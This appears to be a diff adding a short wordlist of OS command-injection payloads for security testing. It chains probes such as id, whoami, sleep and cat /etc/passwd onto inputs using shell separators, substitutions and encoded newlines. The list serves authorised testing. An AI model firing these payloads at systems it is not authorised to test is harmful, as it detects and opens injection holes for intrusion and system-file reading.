@@ -1,0 +1,27 @@
+# OS Command Injection Payloads
+;id
+|id
+$(id)
+`id`
+;whoami
+|whoami
+$(whoami)
+;cat /etc/passwd
+|cat /etc/passwd
+$(cat /etc/passwd)
+& id
+&& id
+|| id
+;ls -la
+|ls
+$(ls)
+;uname -a
+|uname -a
+;sleep 5
+|sleep 5
+$(sleep 5)
+;ping -c 1 127.0.0.1
+|ping -c 1 127.0.0.1
+%0a id
+%0d%0a id
+`sleep 5`
